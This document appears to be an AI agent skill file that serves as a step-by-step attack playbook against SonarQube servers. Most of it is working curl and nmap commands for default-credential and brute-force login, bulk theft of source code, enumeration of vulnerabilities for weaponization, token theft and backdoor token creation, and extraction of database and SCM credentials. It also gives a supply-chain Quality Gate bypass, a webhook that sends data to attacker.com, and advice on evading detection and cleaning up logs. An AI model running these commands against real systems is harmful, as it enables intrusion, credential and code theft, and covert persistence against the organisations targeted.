---
name: sonarqube-tactics
description: "SonarQube code audit platform attacks. Use when a target is found running a SonarQube instance (default port 9000), when the default credentials admin/admin have not been changed, or when project source code and vulnerability information must be stolen from SonarQube. Covers default credential attacks, project source code theft, vulnerability/issue enumeration (CRITICAL first), user credential and token theft, Quality Gate bypass, configuration file extraction (database/SCM credentials), webhook abuse, plugin analysis, and hotspot and metrics data export"
zh-signals: "针对 SonarQube 代码审计平台的攻击方法，覆盖默认凭据、源码窃取、漏洞枚举、Token 窃取与配置提取。信号:SonarQube,代码审计,默认凭据,源码泄露,DevSecOps"
when-to-use: "Use when a target runs SonarQube (default port 9000), default admin credentials are unchanged, or source code and vulnerability data must be extracted from it in an authorized assessment."
metadata:
  tags: "sonarqube,9000,code audit,source-code,quality-gate,webhook,token,admin,vulnerability scanning,devops"
  category: "postexploit"
---

# SonarQube Code Audit Platform Attacks

SonarQube is the core code quality platform in a DevSecOps stack, listens on port 9000 by default, and the factory credentials admin/admin are frequently overlooked. Once compromised, an attacker can directly obtain all project source code, the list of known vulnerabilities, and internal credentials — effectively the security blueprint of the entire R&D organization.

## ⛔ Further Reading (Must Read)
- Complete API calls and exploitation commands → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: Service Discovery and Version Identification

### 1.1 Nmap Scan

```bash
# Probe the default SonarQube port
nmap -sV -p 9000 TARGET

# HTTP title probe
nmap -p 9000 --script http-title TARGET
```

### 1.2 Version Confirmation

```bash
# Obtain the SonarQube version (no authentication required)
curl -s http://TARGET:9000/api/server/version

# System status (no authentication required)
curl -s http://TARGET:9000/api/system/status | jq .
```

**Key Decision**:
- A version number is returned (e.g. `9.9.0.12345`) → the instance is alive, proceed to Phase 2
- An HTML page is returned → there may be a reverse proxy, check the `/api/server/version` path
- Version < 8.9 → there may be more unpatched known vulnerabilities

---

## Phase 2: Default Credential Detection

### 2.1 Default Credential Attempts

```bash
# Factory default: admin/admin
curl -s -u admin:admin "http://TARGET:9000/api/authentication/validate" | jq .
# {"valid":true} means the login succeeded

# Common weak credentials
for creds in "admin:admin" "admin:sonarqube" "admin:password" "admin:admin123"; do
  echo "Testing $creds"
  result=$(curl -s -u "$creds" "http://TARGET:9000/api/authentication/validate")
  echo "$creds -> $result"
done
```

### 2.2 Token Authentication Test

```bash
# The SonarQube token is used as the username, with an empty password
curl -s -u "squ_xxxxxxxxxxxx:" "http://TARGET:9000/api/authentication/validate"
```

**Key Decision**:
- `{"valid":true}` → the credentials are valid, proceed to the Phase 3 decision tree
- `{"valid":false}` → the credentials are invalid, try other weak password combinations
- 401 Unauthorized → authentication is required, try a token or brute-forcing

---

## Phase 3: Attack Decision Tree

```
Are the credentials valid?
├─ Administrator privileges → the full attack surface
│   ├─ Project source code theft (Phase 4)
│   ├─ Vulnerability information weaponization (Phase 5)
│   ├─ User enumeration + token theft → lateral movement
│   ├─ Quality Gate bypass → supply chain attack
│   ├─ Configuration extraction → database/SCM credentials
│   ├─ Webhook creation → data exfiltration channel
│   └─ Plugin analysis → LDAP/SAML credentials
├─ Regular user privileges
│   ├─ Source code theft from visible projects (Phase 4)
│   ├─ Vulnerability enumeration on visible projects (Phase 5)
│   └─ Personal token generation → persistent access
└─ Unauthenticated (public instance / Force Authentication = false)
    ├─ Source code theft from public projects (Phase 4)
    └─ Vulnerability enumeration on public projects (Phase 5)
```

**Preliminary Information Gathering**:

```bash
# Confirm the current user privileges
curl -s -u admin:admin "http://TARGET:9000/api/users/current" | jq .

# Check whether authentication is required (sonar.forceAuthentication)
curl -s "http://TARGET:9000/api/settings/values?keys=sonar.forceAuthentication" \
  -u admin:admin | jq .

# List all projects (assess the size of the attack surface)
curl -s -u admin:admin \
  "http://TARGET:9000/api/projects/search?ps=500" | jq '.paging.total'
```

---

## Phase 4: Source Code Theft Quick Reference

### 4.1 Project and Component Enumeration

```bash
# List all project keys
curl -s -u admin:admin \
  "http://TARGET:9000/api/projects/search?ps=500" | \
  jq -r '.components[].key'

# Obtain the project file tree
curl -s -u admin:admin \
  "http://TARGET:9000/api/components/tree?component=PROJECT_KEY&ps=500&qualifiers=FIL" | \
  jq -r '.components[].key'
```

### 4.2 Source Code Download

```bash
# Download the source code file by file
curl -s -u admin:admin \
  "http://TARGET:9000/api/sources/raw?key=PROJECT_KEY:src/main/java/App.java" \
  -o App.java

# View the source code with line numbers
curl -s -u admin:admin \
  "http://TARGET:9000/api/sources/lines?key=PROJECT_KEY:pom.xml&from=1&to=500" | \
  jq -r '.sources[].line + ": " + .sources[].code'
```

### 4.3 Batch Download Script

```bash
# Enumerate all files and download them one by one
PROJECT="PROJECT_KEY"
for file in $(curl -s -u admin:admin \
  "http://TARGET:9000/api/components/tree?component=$PROJECT&ps=500&qualifiers=FIL" | \
  jq -r '.components[].key'); do
  mkdir -p "$(dirname "/tmp/sonar-dump/$file")"
  curl -s -u admin:admin \
    "http://TARGET:9000/api/sources/raw?key=$file" \
    -o "/tmp/sonar-dump/$file"
done
```

→ More source code theft techniques → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: Vulnerability Information Weaponization Quick Reference

### 5.1 CRITICAL Vulnerability Enumeration First

```bash
# All CRITICAL severity vulnerabilities (directly exploitable)
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?types=VULNERABILITY&severities=CRITICAL&ps=500" | \
  jq '.issues[] | {rule: .rule, message: .message, component: .component, line: .line}'

# Search for issues containing sensitive keywords
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?ps=500" | \
  jq '.issues[] | select(.message | test("password|secret|token|credential|hardcoded"; "i"))'
```

### 5.2 Security Hotspot Enumeration

```bash
# Security Hotspots (security points that require manual review)
curl -s -u admin:admin \
  "http://TARGET:9000/api/hotspots/search?projectKey=PROJECT_KEY&ps=500" | \
  jq '.hotspots[] | {key: .key, message: .message, component: .component, vulnerabilityProbability: .vulnerabilityProbability}'
```

### 5.3 Metrics Data Export

```bash
# Project security metrics
curl -s -u admin:admin \
  "http://TARGET:9000/api/measures/component?component=PROJECT_KEY&metricKeys=bugs,vulnerabilities,code_smells,security_hotspots,coverage" | \
  jq '.component.measures[]'
```

→ Complete vulnerability enumeration and weaponization methods → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 6: User Credential and Token Theft

```bash
# Enumerate all users
curl -s -u admin:admin \
  "http://TARGET:9000/api/users/search?ps=500" | \
  jq '.users[] | {login: .login, name: .name, email: .email, groups: .groups}'

# View user tokens (requires administrator)
curl -s -u admin:admin \
  "http://TARGET:9000/api/user_tokens/search?login=USERNAME" | \
  jq '.userTokens[]'

# Generate a new token for the target user (persistent backdoor)
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/user_tokens/generate" \
  -d "name=backup-token&login=USERNAME" | jq .
```

---

## Phase 7: Configuration and Credential Extraction

```bash
# Export the global configuration (including database/SCM credentials)
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | \
  jq '.settings[] | select(.key | test("password|token|secret|jdbc|scm|ldap|smtp"; "i"))'

# Database connection information
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values?keys=sonar.jdbc.url,sonar.jdbc.username" | jq .

# ALM (source code hosting platform) integration configuration
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | \
  jq '.settings[] | select(.key | test("github|gitlab|bitbucket|azure"; "i"))'
```

---

## Phase 8: Quality Gate Bypass and Webhook Abuse

### 8.1 Quality Gate Bypass

```bash
# List all Quality Gates
curl -s -u admin:admin \
  "http://TARGET:9000/api/qualitygates/list" | jq '.qualitygates[]'

# Create a permissive Quality Gate (supply chain attack)
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/qualitygates/create" -d "name=Permissive"

# Associate the project with the permissive gate
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/qualitygates/select" \
  -d "gateId=GATE_ID&projectKey=PROJECT_KEY"
```

### 8.2 Webhook Abuse

```bash
# Create a webhook (data exfiltration channel)
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/webhooks/create" \
  -d "name=notify&url=https://attacker.com/hook&project=PROJECT_KEY"

# List the existing webhooks
curl -s -u admin:admin \
  "http://TARGET:9000/api/webhooks/list?project=PROJECT_KEY" | jq '.webhooks[]'
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for plugin analysis and bulk export techniques

---

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| curl + jq | The core combination for interacting with the SonarQube REST API |
| nmap | Port discovery and service version probing |
| sonarqube-scanner | The official scanner, useful for understanding the project analysis flow |
| hydra | Web form credential brute-forcing |
| nuclei | SonarQube default credential and known vulnerability template scanning |

---

## Notes

- The SonarQube API paginates by default, the `ps` parameter caps at 500, use the `p` parameter to page through larger result sets
- `/api/sources/raw` returns the source code per file, large projects need a script for batch download
- A generated token's plaintext is displayed only once; existing tokens only show the name and creation time, the plaintext cannot be recovered
- Quality Gate modifications affect the CI/CD pipeline and may be detected by operations monitoring
- After a webhook is created, a callback fires every time a project analysis completes, control the callback frequency to avoid exposure
- Some sensitive fields in the configuration API (such as passwords) may be masked and shown as `*****`, use other means to obtain them
- The activity log can be viewed through `/api/ce/activity`, remember to clean up or control the frequency of operations
